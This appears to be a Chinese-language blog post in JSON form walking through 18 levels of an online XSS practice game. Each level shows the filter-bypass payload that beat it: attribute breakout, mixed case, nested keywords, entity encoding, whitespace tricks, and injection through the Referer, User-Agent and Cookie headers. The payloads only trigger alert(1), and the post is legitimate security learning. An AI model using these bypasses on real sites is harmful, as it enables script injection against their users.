{"title":"XSS挑战之旅","uid":"78d694166ceafa715bcdb2c1afc2ef78","slug":"XSS挑战之旅","date":"2020-05-27T01:02:16.000Z","updated":"2020-05-27T14:20:52.000Z","comments":true,"path":"api/articles/XSS挑战之旅.json","keywords":"A1andNS","cover":[],"content":"<p>无意间看到了一个XSS小游戏，就玩了一下。</p>\n<p>链接：<a href=\"https://xss.tesla-space.com/\">https://xss.tesla-space.com/</a></p>\n<h2 id=\"level1\"><a href=\"#level1\" class=\"headerlink\" title=\"level1\"></a>level1</h2><p>看显示的界面和url，可以知道name参数是一个关键，我试着再name参数写入一个脚本。</p>\n<p><code>name=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>，这就直接过关了，看来只要能够让脚本得到运行就可以过关。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120145.png\" alt=\"1\"></p>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120209.png\" alt=\"2\"></p>\n<p>没有成功弹窗，所以要想办法把脚本剥离出来，那就要把value和input先闭合了才行。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120225.png\" alt=\"3\"></p>\n<p>用<code>1&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>，闭合value和input。</p>\n<p>过关!!!</p>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p>可以用<code>&#39;</code>来闭合value，但是<code>&gt;</code>被转义了，无法闭合input。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120248.png\" alt=\"4\"></p>\n<p>那就加一个onclick来搞，<code>1&#39; onclick=alert(1)</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120307.png\" alt=\"5\"></p>\n<p><code>1&#39; onclick=alert(1)//</code>把后面的东西注释掉。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120325.png\" alt=\"6\"></p>\n<h2 id=\"level4\"><a href=\"#level4\" class=\"headerlink\" title=\"level4\"></a>level4</h2><p>和上一关一样的过滤了<code>&lt;</code>、<code>&gt;</code>，双引号可以闭合value，但是input没法闭合，那就在用一下上一关的办法看看。</p>\n<p>一样的操作过关。</p>\n<p><code>1&quot; onclick=alert(1)//</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120339.png\" alt=\"7\"></p>\n<h2 id=\"level5\"><a href=\"#level5\" class=\"headerlink\" title=\"level5\"></a>level5</h2><p>这回想要直接搞失败了，过滤了onclick，但是这次没有过滤<code>&gt;</code>，<code>&lt;</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120355.png\" alt=\"8\"></p>\n<p>试一下script，结果被过滤了，那就只能另辟蹊径了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120409.png\" alt=\"9\"></p>\n<p>使用<code>&lt;a&gt;</code>标签，这个没有被过滤。</p>\n<p>payload：<code>1&quot;&gt;&lt;a href=&quot; javascript:alert(1)&quot;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120423.png\" alt=\"10\"></p>\n<h2 id=\"level6\"><a href=\"#level6\" class=\"headerlink\" title=\"level6\"></a>level6</h2><p>试了一下<code>&quot;</code>、<code>&gt;</code>没有被过滤，script依旧被过滤了，onclick也是一样被过滤。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120438.png\" alt=\"11\"></p>\n<p>href也已经被过滤了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120451.png\" alt=\"12\"></p>\n<p>但是可以大小写绕过，这里考察的就是大小写绕过，这是因为使用str_replace()函数。</p>\n<p>payload：<code>1&quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120505.png\" alt=\"13\"></p>\n<h2 id=\"level7\"><a href=\"#level7\" class=\"headerlink\" title=\"level7\"></a>level7</h2><p>经过尝试onclick，script，href都被过滤了，并且使用空格替换，所以考虑使用单词嵌套绕过。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120525.png\" alt=\"14\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120537.png\" alt=\"15\"></p>\n<p>过关，这里主要考察的就是嵌套单词绕过方法。</p>\n<h2 id=\"level8\"><a href=\"#level8\" class=\"headerlink\" title=\"level8\"></a>level8</h2><p>经过尝试发现<code>&gt;</code>被过滤了，那就试试用onclick方法，onclick方法被过滤。发现关键在于输入内容会被加入到href中。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120553.png\" alt=\"16\"></p>\n<p>试一下<code>javascript:alert(1)</code>发现script被过滤，试一下大小写绕过。发现行不通。那就考虑一下能不能用编码的方式绕过。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120610.png\" alt=\"17\"></p>\n<p>这里我用来HEX编码，</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">payload：&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120630.png\" alt=\"16\"></p>\n<h2 id=\"level9\"><a href=\"#level9\" class=\"headerlink\" title=\"level9\"></a>level9</h2><p><code>&gt;</code>被过滤，试一试onclick没有成功。</p>\n<p>看来一下href处提示连接不合法。</p>\n<p>试了一下输入<code>http://1&quot; onclick=alert(1)//</code>,发现href处有了，那么可能是要有http存在，试一下放到尾巴。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120649.png\" alt=\"17\"></p>\n<p>发现是可以的，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120745.png\" alt=\"18\"></p>\n<p>但是javascript被过滤了，大小写无法绕过。看来是要编码了。那么就构造payload吧！</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">payload：&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&#x2F;&#x2F;http:&#x2F;&#x2F;\n\n#这里http不能一起编码，不然系统会认为没有http变成非法的连接了。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120804.png\" alt=\"20\"></p>\n<p>也可以使用%09换行符绕过。</p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">javascr%09ipt:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"leve10\"><a href=\"#leve10\" class=\"headerlink\" title=\"leve10\"></a>leve10</h2><p>没有输入框了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120821.png\" alt=\"21\"></p>\n<p>但是发现有隐藏Form。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120837.png\" alt=\"22\"></p>\n<p>发现<code>https://xss.tesla-space.com/level10.php?t_link=123&amp;t_history=123&amp;t_sort=123</code>后，自由t_sort的value发生变化，所以注入点实在t_sort。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120857.png\" alt=\"23\"></p>\n<p>那么构造payload：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header-name keyword\">https:</span>//xss.tesla-space.com/level10.php?keyword=1&amp;t_sort=1%22%20type=%22text%22%20onclick=alert(1)//<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527120913.png\" alt=\"24\"></p>\n<p>成功过关！！</p>\n<h2 id=\"level11\"><a href=\"#level11\" class=\"headerlink\" title=\"level11\"></a>level11</h2><p>和上关一样发现了隐藏表单，那就试试看了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527152703.png\" alt=\"25\"></p>\n<p>和上题一样应该是在t_sort位置。但是视乎不可以，输入的内容会被转换处理，无法插入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527152720.png\" alt=\"26\"></p>\n<p>看来应该是利用t_ref来搞吧，要用HTTP头部来入。Hackbar就可以搞了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527152733.png\" alt=\"27\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer: 1&quot; type&#x3D;text onclick&#x3D;alert(1)&#x2F;&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527152749.png\" alt=\"28\"></p>\n<p>过关！！！</p>\n<h2 id=\"level12\"><a href=\"#level12\" class=\"headerlink\" title=\"level12\"></a>level12</h2><p>一种直觉，注入点在UA，所以二话不说，搞他。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527220114.png\" alt=\"29\"></p>\n<p>payload见图片：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527220132.png\" alt=\"30\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221250.png\" alt=\"31\"></p>\n<p>成功通关！！！</p>\n<h2 id=\"level13\"><a href=\"#level13\" class=\"headerlink\" title=\"level13\"></a>level13</h2><p>看这个的意识应该是cookie处做文章。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221312.png\" alt=\"32\"></p>\n<p>先看看cookie格式，我用hackbar没有操作成功，那就只能用burp了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221325.png\" alt=\"33\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie: __cfduid&#x3D;dc935a1563940f4dc6ca2f94c7daec3611590568925; user&#x3D;1&quot;+type&#x3D;text+onclick&#x3D;alert(1)&#x2F;&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221337.png\" alt=\"34\"></p>\n<p>通关</p>\n<h2 id=\"level14\"><a href=\"#level14\" class=\"headerlink\" title=\"level14\"></a>level14</h2><p>这题org没打开，就只能跳过了，查了一下是考察exifXSS</p>\n<h2 id=\"level15\"><a href=\"#level15\" class=\"headerlink\" title=\"level15\"></a>level15</h2><p>有一个ng-include:，这个类似PHP里面的include，所以考虑包含。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221358.png\" alt=\"35\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>chrome访问是以注释显示ngInclude未定义，而Firefox访问是有的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221413.png\" alt=\"36\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221814.png\" alt=\"37\"></p>\n<p>感觉有点坑，结果还是Firefox打不通，chrome可以打通。有点迷。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221525.png\" alt=\"38\"></p>\n<p>通关</p>\n<h2 id=\"level16\"><a href=\"#level16\" class=\"headerlink\" title=\"level16\"></a>level16</h2><p>script被过滤了，考虑其他方法。试一下&lt;img的办法。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221843.png\" alt=\"39\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?keyword&#x3D;&lt;img%20src&#x3D;1%20onerror&#x3D;alert(1)&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>发现空额被过滤了，用%0a来绕过</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?keyword&#x3D;&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527221942.png\" alt=\"40\"></p>\n<p>通关！！！</p>\n<h2 id=\"level17\"><a href=\"#level17\" class=\"headerlink\" title=\"level17\"></a>level17</h2><p>一个flash组件，它是在<code>&lt;embed&gt;</code>标签里的而url传入内容会被加到embed的src里，所以直接在url处写入一个东西来执行脚本，用<code>onmouseover=alert(1)</code>,就可以了。还可以用<code>onmousemove=alert(1)</code>、<code>onmousedown=alert(1)</code>、<code>onmouseout=alert(1)</code>、<code>onmouseup=alert(1)</code>、<code>onmousewheel=alert(1)</code>、<code>onekeydown=alert(1)</code>、<code>onkeypress=alert(1)</code>、<code>onkeyup=alert(1)</code>都是可以的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527222017.png\" alt=\"41\"></p>\n<p>过关！！</p>\n<h2 id=\"level18\"><a href=\"#level18\" class=\"headerlink\" title=\"level18\"></a>level18</h2><p>和上一题一样，我还是用了<code>onmouseover=alert(1)</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200527222042.png\" alt=\"42\"></p>\n<p>通关！！！</p>\n","text":"无意间看到了一个XSS小游戏，就玩了一下。 链接：https://xss.tesla-space.com/ level1看显示的界面和url，可以知道name参数是一个关键，我试着再name参数写入一个脚本。 name=&lt;script&gt;alert(&quot;XSS&...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":35,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"XSS","slug":"XSS","count":3,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level1\"><span class=\"toc-text\">level1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level2\"><span class=\"toc-text\">level2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level3\"><span class=\"toc-text\">level3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level4\"><span class=\"toc-text\">level4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level5\"><span class=\"toc-text\">level5</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level6\"><span class=\"toc-text\">level6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level7\"><span class=\"toc-text\">level7</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level8\"><span class=\"toc-text\">level8</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level9\"><span class=\"toc-text\">level9</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#leve10\"><span class=\"toc-text\">leve10</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level11\"><span class=\"toc-text\">level11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level12\"><span class=\"toc-text\">level12</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level13\"><span class=\"toc-text\">level13</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level14\"><span class=\"toc-text\">level14</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level15\"><span class=\"toc-text\">level15</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level16\"><span class=\"toc-text\">level16</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level17\"><span class=\"toc-text\">level17</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#level18\"><span class=\"toc-text\">level18</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"HTML基础","uid":"e2737fbb24bd27a9f4ebebdd23c4095f","slug":"HTML基础","date":"2020-05-27T02:18:43.000Z","updated":"2020-05-27T15:42:04.000Z","comments":true,"path":"api/articles/HTML基础.json","keywords":"A1andNS","cover":"https://s1.ax1x.com/2020/05/27/tEIsl6.jpg","text":"HTML文档的后缀名 .html .htm HTML标签&lt;标签&gt;内容&lt;/标签&gt;这是HTML的标准格式了，用标签来书写。 HTML元素一个 HTML 元素包含了开始标签与结束标签，如下实例: HTML 元素: &lt;p>这是一个段落。&lt;/p> HTM...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"HTML学习","slug":"HTML学习","count":5,"path":"api/categories/HTML学习.json"}],"tags":[{"name":"HTML","slug":"HTML","count":5,"path":"api/tags/HTML.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SSRF学习","uid":"d422db4ec62375a9a1399b6a63a1e320","slug":"SSRF学习","date":"2020-05-20T02:09:59.000Z","updated":"2020-11-18T14:07:28.000Z","comments":true,"path":"api/articles/SSRF学习.json","keywords":"A1andNS","cover":null,"text":"SSRF概念SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":35,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"SSRF","slug":"SSRF","count":1,"path":"api/tags/SSRF.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}